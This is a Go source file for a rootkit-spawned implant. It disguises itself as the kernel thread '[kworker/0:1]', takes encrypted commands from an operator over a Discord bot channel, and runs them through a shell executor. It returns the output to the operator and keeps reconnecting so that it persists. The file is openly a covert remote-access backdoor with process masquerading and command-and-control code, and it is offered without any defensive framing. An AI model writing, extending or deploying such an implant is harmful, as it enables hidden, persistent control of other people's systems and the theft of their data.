package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"sasakbpf/internal/config"
	"sasakbpf/internal/discord"
	"sasakbpf/internal/runner"
)

// Agent (target implant) entry point. Spawned by the rootkit's
// discord_spawn.c via call_usermodehelper, argv[0] disguised as
// "[kworker/0:1]". procname_linux.go also renames /proc/self/comm
// defensively so if call_usermodehelper is replaced by manual exec,
// the comm column still looks like a kernel thread.
func main() {
	setProcName("[kworker/0:1]")

	cfg := config.Load()
	if cfg.BotToken == "" || cfg.ChannelID == "" || cfg.AESKeyHex == "" {
		fmt.Fprintln(os.Stderr, "[agent] missing config — need SD_BOT_TOKEN, SD_CHANNEL_ID, SD_AES_KEY_HEX")
		os.Exit(2)
	}
	if cfg.TargetID == "" {
		fmt.Fprintln(os.Stderr, "[agent] missing SD_TARGET_ID")
		os.Exit(2)
	}
	if cfg.Self == "" {
		cfg.Self = "agent"
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	echoMode := strings.EqualFold(os.Getenv("SD_MODE"), "echo") // Fase 3 test shim

	agent := discord.NewAgent(cfg)
	agent.OnCommand(func(plaintext string) {
		now := time.Now().UTC().Format(time.RFC3339)
		fmt.Fprintf(os.Stderr, "[agent] cmd @%s: %q (len=%d)\n", now, truncate(plaintext, 80), len(plaintext))

		// Fase 3 echo shim: reply the command back verbatim so operator
		// can verify gateway<->implant round-trip before wiring the real
		// shell executor (which lands in Fase 4).
		var output string
		if echoMode {
			output = "echo: " + plaintext
		} else {
			// Fase 4 entry point: dispatch into runner.
			res := runner.Exec(ctx, plaintext, 0)
			output = formatRunner(res)
		}
		if err := agent.SendOutput(ctx, output); err != nil {
			fmt.Fprintf(os.Stderr, "[agent] send output: %v\n", err)
		}
	})

	// Reconnect with jitter backoff. call_usermodehelper parent never
	// retries — if agent exits, rootkit hook respawns it via signal 59.
	for {
		err := agent.Run(ctx)
		if ctx.Err() != nil {
			return
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "[agent] gateway: %v — reconnecting\n", err)
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}
	}
}

func formatRunner(r runner.Result) string {
	var sb strings.Builder
	if r.Cmd != "" {
		fmt.Fprintf(&sb, "$ %s\n", r.Cmd)
	}
	if r.Stdout != "" {
		sb.WriteString(r.Stdout)
		if !strings.HasSuffix(r.Stdout, "\n") {
			sb.WriteByte('\n')
		}
	}
	if r.Stderr != "" {
		sb.WriteString("[stderr]\n")
		sb.WriteString(r.Stderr)
		if !strings.HasSuffix(r.Stderr, "\n") {
			sb.WriteByte('\n')
		}
	}
	if r.Err != nil {
		fmt.Fprintf(&sb, "[exit] %v (dur=%s)\n", r.Err, r.Dur)
	}
	if sb.Len() == 0 {
		return "(no output)\n"
	}
	return sb.String()
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}